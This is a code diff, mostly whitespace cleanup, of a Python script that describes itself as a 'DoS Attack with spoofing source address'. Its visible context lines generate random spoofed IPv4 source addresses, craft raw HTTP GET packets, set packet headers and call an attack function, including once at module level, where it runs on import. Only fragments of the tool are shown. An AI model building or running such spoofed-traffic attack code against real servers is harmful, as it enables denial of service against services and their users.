@@ -24,21 +24,18 @@ TIME_FORMAT = '%Y-%m-%d,%H:%M:%S'
 
 
 def get_random_address_list(number_address=DEFAULT_NUMBER_RANDOM_ADDRESS):
-
     list_address = [[randint(0, 255), randint(0, 255), randint(0, 255), randint(0, 255)] for i in range(number_address)]
     list_address = ['.'.join(list(map(str, i))) for i in list_address]
     return list_address
 
 
 def create_spoofing_packet(requisition, version=DEFAULT_HTTP_VERSION):
-
     spoofing_packet = "GET /{} HTTP/{} \n\n".format(str(requisition), version)
     spoofing_packet = bytes(spoofing_packet, "utf-8")
     return spoofing_packet
 
 
 def attack_function():
-
     headers = Header(time_life_packet=DEFAULT_TIME_LIFE_PACKET, source_address=DEFAULT_SOURCE_ADDRESS,
                      destination_address=DEFAULT_DESTINATION_ADDRESS, source_port=DEFAULT_SOURCE_PORT,
                      destination_port=DEFAULT_DESTINATION_PORT, internal=1)
@@ -82,7 +79,6 @@ def show_config(args):
 
 
 def add_arguments(parser):
-
     help_msg = 'Http version protocol (Default {})'.format(DEFAULT_HTTP_VERSION)
     parser.add_argument("--http_version", type=float, help=help_msg, default=DEFAULT_HTTP_VERSION)
 
@@ -120,7 +116,6 @@ def add_arguments(parser):
 
 
 def main():
-
     argument_parser = ArgumentParser(description='DoS Attack with spoofing source address')
     argument_parser = add_arguments(argument_parser)
     arguments = argument_parser.parse_args()
@@ -135,5 +130,6 @@ def main():
         logging.basicConfig(format="%(message)s", datefmt=TIME_FORMAT, level=arguments.verbosity)
 
     attack_function()
+
 
 attack_function()
